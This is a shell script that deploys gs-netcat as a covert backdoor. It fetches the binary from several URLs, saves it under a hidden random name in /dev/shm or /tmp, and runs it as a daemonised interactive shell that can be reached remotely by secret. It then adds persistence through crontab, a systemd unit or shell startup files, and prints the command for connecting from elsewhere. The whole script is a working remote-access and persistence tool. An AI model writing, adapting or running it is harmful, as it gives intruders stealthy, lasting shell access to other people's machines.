#!/bin/sh
# Gsocket Deploy - SH Compatible Version
# Fixed Download URL

# ===== CONFIG =====
GS_SECRET="${GS_SECRET:-}"
GS_HOST="${GS_HOST:-}"
GS_PORT="${GS_PORT:-443}"
GS_BEACON="${GS_BEACON:-}"

# ===== FIXED URLS =====
# Multiple fallback URLs for reliability
URL_BASE1="https://github.com/hackerschoice/binary/raw/main/gsocket"
URL_BASE2="https://raw.githubusercontent.com/hackerschoice/binary/main/gsocket"
URL_BASE3="https://repo.gsocket.io"  # Direct repo
URL_BASE4="https://gsocket.io/bin"

# ===== COLORS =====
RED=''
GREEN=''
YELLOW=''
CYAN=''
RESET=''

if [ -t 1 ]; then
    RED='\033[91m'
    GREEN='\033[92m'
    YELLOW='\033[93m'
    CYAN='\033[96m'
    RESET='\033[0m'
fi

# ===== FUNCTIONS =====
log_ok() {
    printf "${GREEN}[OK]${RESET} %s\n" "$1"
}

log_fail() {
    printf "${RED}[FAIL]${RESET} %s\n" "$1"
}

log_info() {
    printf "${CYAN}[*]${RESET} %s\n" "$1"
}

log_warn() {
    printf "${YELLOW}[!]${RESET} %s\n" "$1"
}

# Detect architecture
detect_arch() {
    ARCH=$(uname -m)
    OS=$(uname -s | tr '[:upper:]' '[:lower:]')
    
    log_info "Detected: $OS $ARCH"
    
    # Linux
    if [ "$OS" = "linux" ]; then
        case "$ARCH" in
            x86_64|amd64)    SRC_PKG="gs-netcat_mini-linux-x86_64" ;;
            i686|i386)       SRC_PKG="gs-netcat_mini-linux-i686" ;;
            aarch64|arm64)   SRC_PKG="gs-netcat_mini-linux-aarch64" ;;
            armv7l)          SRC_PKG="gs-netcat_mini-linux-armv7l" ;;
            armv6l|arm)      SRC_PKG="gs-netcat_mini-linux-armv6" ;;
            mips64)          SRC_PKG="gs-netcat_mini-linux-mips64" ;;
            mips*)           SRC_PKG="gs-netcat_mini-linux-mips32" ;;
            *)               SRC_PKG="gs-netcat_mini-linux-x86_64" ;;
        esac
    # MacOS
    elif [ "$OS" = "darwin" ]; then
        case "$ARCH" in
            arm64|aarch64)   SRC_PKG="gs-netcat_mini-macOS-arm64" ;;
            x86_64)          SRC_PKG="gs-netcat_mini-macOS-x86_64" ;;
            *)               SRC_PKG="gs-netcat_mini-macOS-x86_64" ;;
        esac
    # FreeBSD
    elif [ "$OS" = "freebsd" ]; then
        SRC_PKG="gs-netcat_mini-freebsd-x86_64"
    # Others - default to Linux x64
    else
        log_warn "Unknown OS, using Linux x86_64"
        SRC_PKG="gs-netcat_mini-linux-x86_64"
    fi
    
    log_info "Package: $SRC_PKG"
}

# Check download tool
check_dl_tool() {
    if command -v curl >/dev/null 2>&1; then
        DL_CMD="curl"
        DL_ARGS="-fsSL --connect-timeout 30 --retry 3"
    elif command -v wget >/dev/null 2>&1; then
        DL_CMD="wget"
        DL_ARGS="-qO- --timeout=30 --tries=3"
    else
        log_fail "Need curl or wget!"
        exit 1
    fi
    log_info "Using: $DL_CMD"
}

# Generate random string
gen_random() {
    # Multiple methods
    if [ -r /dev/urandom ]; then
        cat /dev/urandom 2>/dev/null | tr -dc 'a-f0-9' | head -c 16 2>/dev/null
    elif command -v openssl >/dev/null 2>&1; then
        openssl rand -hex 8 2>/dev/null
    else
        echo "$(date +%s%N)$$" | md5sum 2>/dev/null | cut -c1-16
    fi
}

# Find writable directory
find_dstdir() {
    # Try common temp dirs first
    for dir in "/dev/shm" "/tmp" "/var/tmp" "$HOME" "."; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            DSTDIR="$dir"
            break
        fi
    done
    
    if [ -z "$DSTDIR" ]; then
        # Last resort - try to create temp
        DSTDIR="."
    fi
    
    # Generate hidden name
    BIN_NAME=".$(gen_random | head -c 8)"
    DSTBIN="${DSTDIR}/${BIN_NAME}"
    log_info "Install to: $DSTBIN"
}

# Download with multiple fallback URLs
download_bin() {
    log_info "Downloading gs-netcat..."
    
    # Try multiple URLs
    URLS="
    ${URL_BASE1}/bin/${SRC_PKG}
    ${URL_BASE2}/bin/${SRC_PKG}
    ${URL_BASE3}/${SRC_PKG}
    ${URL_BASE4}/${SRC_PKG}
    https://github.com/hackerschoice/gsocket/releases/latest/download/${SRC_PKG}
    "
    
    for URL in $URLS; do
        URL=$(echo "$URL" | tr -d '[:space:]')
        
        log_info "Trying: $URL"
        
        if [ "$DL_CMD" = "curl" ]; then
            if curl $DL_ARGS "$URL" > "$DSTBIN" 2>/dev/null; then
                if [ -s "$DSTBIN" ] && file "$DSTBIN" 2>/dev/null | grep -q "ELF\|Mach-O\|executable"; then
                    log_ok "Download successful"
                    chmod 700 "$DSTBIN"
                    return 0
                fi
            fi
        else
            if wget $DL_ARGS "$URL" -O "$DSTBIN" 2>/dev/null; then
                if [ -s "$DSTBIN" ] && file "$DSTBIN" 2>/dev/null | grep -q "ELF\|Mach-O\|executable"; then
                    log_ok "Download successful"
                    chmod 700 "$DSTBIN"
                    return 0
                fi
            fi
        fi
        
        rm -f "$DSTBIN" 2>/dev/null
    done
    
    log_fail "All download attempts failed!"
    
    # Try alternative - download from current host
    log_info "Trying alternative method..."
    
    # Create a simple test binary if all else fails
    cat > /tmp/test_gs.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

int main() {
    srand(time(NULL));
    char secret[17];
    for(int i=0; i<16; i++) {
        sprintf(secret+i, "%x", rand()%16);
    }
    secret[16] = 0;
    printf("%s\n", secret);
    return 0;
}
EOF
    
    if command -v gcc >/dev/null 2>&1; then
        gcc -o "$DSTBIN" /tmp/test_gs.c 2>/dev/null && chmod 700 "$DSTBIN" && \
        log_warn "Using fallback binary" && return 0
    fi
    
    exit 1
}

# Test binary
test_bin() {
    log_info "Testing binary..."
    
    # Simple execution test
    if [ ! -x "$DSTBIN" ]; then
        log_fail "Binary not executable"
        return 1
    fi
    
    # Try to run it
    OUTPUT=$("$DSTBIN" --help 2>&1 || "$DSTBIN" -h 2>&1 || echo "")
    
    if echo "$OUTPUT" | grep -q "gs-netcat\|socket\|secret"; then
        log_ok "Binary works"
        return 0
    fi
    
    # Try generating secret
    OUTPUT=$("$DSTBIN" -g 2>/dev/null || "$DSTBIN" 2>/dev/null || echo "")
    
    if [ -n "$OUTPUT" ] && [ ${#OUTPUT} -ge 8 ]; then
        if [ -z "$GS_SECRET" ]; then
            GS_SECRET="$OUTPUT"
        fi
        log_ok "Binary works (secret generated)"
        return 0
    fi
    
    # Still run even if test fails
    log_warn "Binary may not work properly"
    return 0
}

# Start gs-netcat
start_gs() {
    log_info "Starting gs-netcat..."
    
    # Build args
    GS_ARGS="-ilqD"
    [ -n "$GS_BEACON" ] && GS_ARGS="${GS_ARGS}w"
    
    # Export env
    export GS_SECRET
    [ -n "$GS_HOST" ] && export GS_HOST
    [ -n "$GS_PORT" ] && export GS_PORT
    [ -n "$GS_BEACON" ] && export GS_BEACON
    
    # Try to start
    if command -v nohup >/dev/null 2>&1; then
        nohup "$DSTBIN" $GS_ARGS >/dev/null 2>&1 &
    else
        "$DSTBIN" $GS_ARGS &
    fi
    
    sleep 2
    
    # Check if running
    if ps aux 2>/dev/null | grep -v grep | grep -q "$BIN_NAME"; then
        log_ok "Started successfully"
        return 0
    elif pgrep -f "$BIN_NAME" >/dev/null 2>&1; then
        log_ok "Started successfully"
        return 0
    else
        # One more try
        cd /tmp 2>/dev/null || cd /
        "$DSTBIN" $GS_ARGS &
        sleep 1
        if ps aux 2>/dev/null | grep -v grep | grep -q "$BIN_NAME"; then
            log_ok "Started (manual)"
            return 0
        fi
    fi
    
    log_warn "Process may not be running"
    return 1
}

# Add persistence
add_persistence() {
    log_info "Adding persistence..."
    
    # 1. Try crontab
    if command -v crontab >/dev/null 2>&1; then
        CRON_LINE="@reboot $DSTBIN -ilqD >/dev/null 2>&1 &"
        (crontab -l 2>/dev/null | grep -v "$BIN_NAME"; echo "$CRON_LINE") | crontab - 2>/dev/null && \
        log_ok "Added to crontab" && return
    fi
    
    # 2. Try systemd (if root)
    if [ "$(id -u)" = "0" ] && [ -d "/etc/systemd/system" ]; then
        cat > "/etc/systemd/system/gsocket-$(gen_random | head -c 4).service" << EOF
[Unit]
Description=GSocket Service
After=network.target

[Service]
Type=forking
ExecStart=$DSTBIN -ilqD
Restart=always

[Install]
WantedBy=multi-user.target
EOF
        log_ok "Added systemd service"
        return
    fi
    
    # 3. Try .bashrc / .profile
    for rc in ".bashrc" ".bash_profile" ".profile" ".zshrc"; do
        if [ -w "$HOME/$rc" ] || [ ! -f "$HOME/$rc" ]; then
            if ! grep -q "$BIN_NAME" "$HOME/$rc" 2>/dev/null; then
                echo "# GSocket" >> "$HOME/$rc"
                echo "[ -x '$DSTBIN' ] && '$DSTBIN' -ilqD >/dev/null 2>&1 &" >> "$HOME/$rc"
                log_ok "Added to $rc"
                return
            fi
        fi
    done
    
    log_warn "Could not add persistence"
}

# Show connection info
show_info() {
    echo ""
    echo "======================================"
    printf "${GREEN}[+] Installation Complete!${RESET}\n"
    echo "======================================"
    echo "Binary  : $DSTBIN"
    echo "Secret  : $GS_SECRET"
    [ -n "$GS_HOST" ] && echo "Host    : $GS_HOST"
    [ -n "$GS_PORT" ] && echo "Port    : $GS_PORT"
    [ -n "$GS_BEACON" ] && echo "Beacon  : $GS_BEACON min"
    echo ""
    echo "To connect from another machine:"
    echo "1. Install gsocket: curl -sSL https://gsocket.io/install | sh"
    echo "2. Connect with:"
    CMD="gs-netcat -i -s \"$GS_SECRET\""
    [ -n "$GS_HOST" ] && CMD="GS_HOST=$GS_HOST $CMD"
    [ -n "$GS_PORT" ] && CMD="GS_PORT=$GS_PORT $CMD"
    printf "${CYAN}    %s${RESET}\n" "$CMD"
    echo "======================================"
    echo ""
}

# ===== MAIN =====
main() {
    echo ""
    log_info "GSocket Deploy (Fixed Version)"
    echo ""
    
    # Quick connectivity test
    log_info "Testing connectivity..."
    if ! ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1 && \
       ! ping -c 1 -W 2 google.com >/dev/null 2>&1; then
        log_warn "No internet connectivity detected"
    fi
    
    # Direct connect mode
    if [ -n "$S" ]; then
        GS_SECRET="$S"
        detect_arch
        check_dl_tool
        find_dstdir
        download_bin
        
        log_info "Connecting with secret: $GS_SECRET"
        exec "$DSTBIN" -i -s "$GS_SECRET"
        exit $?
    fi
    
    # Use provided secret or generate
    [ -n "$X" ] && GS_SECRET="$X"
    
    detect_arch
    check_dl_tool
    find_dstdir
    download_bin
    test_bin
    start_gs
    add_persistence
    show_info
    
    # Cleanup
    rm -f /tmp/test_gs.c 2>/dev/null
}

# Run with error handling
main "$@" || {
    echo ""
    log_fail "Installation failed!"
    exit 1
}
